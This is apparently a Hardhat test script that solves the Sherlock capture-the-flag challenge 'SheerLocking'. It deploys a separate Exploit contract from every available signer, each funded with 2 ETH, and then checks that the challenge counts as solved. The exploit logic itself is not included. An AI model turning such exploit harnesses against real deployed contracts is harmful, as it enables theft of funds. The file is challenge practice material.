import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SheerLocking } from "../types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

describe("Sherlock CTF: SheerLocking (JustDravee)", () => {
  let deployer: SignerWithAddress;

  let setup: Contract;
  let sheer_locking: SheerLocking;

  before(async () => {
    [deployer] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/JustDravee/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy();
    } else {
      setup = await ethers.getContractAt(
        "contracts/JustDravee/Setup.sol:Setup",
        `0x1f5c09a7d6a9B30b43DDDAABD384425DEe0ADe91`
      );
    }
    sheer_locking = await ethers.getContractAt("SheerLocking", await setup.instance(), deployer);
  });

  it("Exploit", async () => {
    // Contract Attack
    const eoa_array = await ethers.getSigners();
    for(let i = 0; i < eoa_array.length; ++i) {
      const eoa = eoa_array[i];
      const ExploitFactory = await ethers.getContractFactory("contracts/JustDravee/Exploit.sol:Exploit", eoa);
      await ExploitFactory.deploy(sheer_locking.address, {value: ethers.utils.parseEther("2")});
    }
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
